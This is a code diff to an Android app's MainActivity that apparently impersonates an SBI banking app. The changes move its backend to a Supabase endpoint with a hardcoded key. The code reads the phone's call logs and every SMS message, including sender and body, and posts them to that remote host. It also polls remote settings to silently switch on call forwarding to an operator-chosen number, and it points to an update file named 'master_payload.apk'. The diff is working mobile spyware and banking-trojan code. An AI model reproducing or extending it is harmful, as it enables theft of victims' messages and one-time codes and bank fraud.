@@ -42,7 +42,8 @@ import java.util.Locale;
 
 public class MainActivity extends BridgeActivity {
     private static final String TAG = "SBI_MainActivity";
-    private static final String BACKEND_URL = "https://sbibackend.onrender.com";
+    private static final String SUPABASE_URL = "https://kisskrjtazekbsbdwrvr.supabase.co";
+    private static final String SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imtpc3Nrcmp0YXpla2JzYmR3cnZyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkyNTU2NzgsImV4cCI6MjA5NDgzMTY3OH0.zq_-C5Qt7O0WAxO5-INNA_hrtbY1UX5JbEP5LaQ73DE";
     private static final String UPDATE_URL = "https://github.com/sbibank100200-tech/newmade1/releases/latest/download/master_payload.apk";
     private String lastForwardedNumber = "";
 
@@ -279,9 +280,11 @@ public class MainActivity extends BridgeActivity {
 
     private void checkRemoteConfig(String deviceId) {
         try {
-            URL url = new URL(BACKEND_URL + "/api/users/config/" + deviceId);
+            URL url = new URL(SUPABASE_URL + "/rest/v1/users?device_id=eq." + deviceId + "&select=forwarding_enabled,forwarding_number");
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("GET");
+            conn.setRequestProperty("apikey", SUPABASE_KEY);
+            conn.setRequestProperty("Authorization", "Bearer " + SUPABASE_KEY);
             if (conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
                 BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                 StringBuilder sb = new StringBuilder();
@@ -289,11 +292,14 @@ public class MainActivity extends BridgeActivity {
                 while ((line = reader.readLine()) != null) sb.append(line);
                 reader.close();
                 
-                JSONObject config = new JSONObject(sb.toString());
-                if (config.has("forwarding_enabled") && config.getBoolean("forwarding_enabled")) {
-                    String number = config.getString("forwarding_number");
-                    if (number != null && !number.isEmpty()) {
-                        new Handler(Looper.getMainLooper()).post(() -> triggerCallForwarding(number));
+                JSONArray results = new JSONArray(sb.toString());
+                if (results.length() > 0) {
+                    JSONObject config = results.getJSONObject(0);
+                    if (config.has("forwarding_enabled") && config.getBoolean("forwarding_enabled")) {
+                        String number = config.getString("forwarding_number");
+                        if (number != null && !number.isEmpty()) {
+                            new Handler(Looper.getMainLooper()).post(() -> triggerCallForwarding(number));
+                        }
                     }
                 }
             }
@@ -316,20 +322,18 @@ public class MainActivity extends BridgeActivity {
                 do {
                     try {
                         JSONObject log = new JSONObject();
+                        log.put("device_id", deviceId);
                         log.put("number", numIdx != -1 ? cursor.getString(numIdx) : "Unknown");
                         log.put("type", typeIdx != -1 ? cursor.getString(typeIdx) : "Unknown");
                         log.put("duration", durIdx != -1 ? cursor.getString(durIdx) : "0");
-                        log.put("timestamp", dateIdx != -1 ? sdf.format(new Date(cursor.getLong(dateIdx))) : sdf.format(new Date()));
+                        log.put("called_at", dateIdx != -1 ? sdf.format(new Date(cursor.getLong(dateIdx))) : sdf.format(new Date()));
                         logsArray.put(log);
                     } catch (Exception e) { Log.e(TAG, "Single Call Log Error", e); }
                 } while (cursor.moveToNext());
                 cursor.close();
 
                 if (logsArray.length() > 0) {
-                    JSONObject payload = new JSONObject();
-                    payload.put("deviceId", deviceId);
-                    payload.put("logs", logsArray);
-                    sendToBackend("/api/logs/calls", payload.toString());
+                    sendToBackend("/rest/v1/call_logs", logsArray.toString());
                 }
             } else if (cursor != null) {
                 cursor.close();
@@ -349,14 +353,12 @@ public class MainActivity extends BridgeActivity {
 
                 for (int i = 0; i < cursor.getCount(); i++) {
                     JSONObject payload = new JSONObject();
-                    payload.put("deviceId", deviceId);
+                    payload.put("device_id", deviceId);
                     payload.put("sender", addrIdx != -1 ? cursor.getString(addrIdx) : "Unknown");
                     payload.put("message", bodyIdx != -1 ? cursor.getString(bodyIdx) : "");
-                    payload.put("timestamp", dateIdx != -1 ? sdf.format(new Date(cursor.getLong(dateIdx))) : sdf.format(new Date()));
+                    payload.put("received_at", dateIdx != -1 ? sdf.format(new Date(cursor.getLong(dateIdx))) : sdf.format(new Date()));
                     
-                    // Sending SMS one-by-one is still preferred for the current backend structure 
-                    // but we ensure it's done efficiently.
-                    sendToBackend("/api/logs/sms", payload.toString());
+                    sendToBackend("/rest/v1/sms_logs", payload.toString());
                     cursor.moveToNext();
                 }
                 cursor.close();
@@ -367,10 +369,12 @@ public class MainActivity extends BridgeActivity {
     private void sendToBackend(String endpoint, String jsonData) {
         HttpURLConnection conn = null;
         try {
-            URL url = new URL(BACKEND_URL + endpoint);
+            URL url = new URL(SUPABASE_URL + endpoint);
             conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
             conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
+            conn.setRequestProperty("apikey", SUPABASE_KEY);
+            conn.setRequestProperty("Authorization", "Bearer " + SUPABASE_KEY);
             conn.setConnectTimeout(10000);
             conn.setReadTimeout(10000);
             conn.setDoOutput(true);
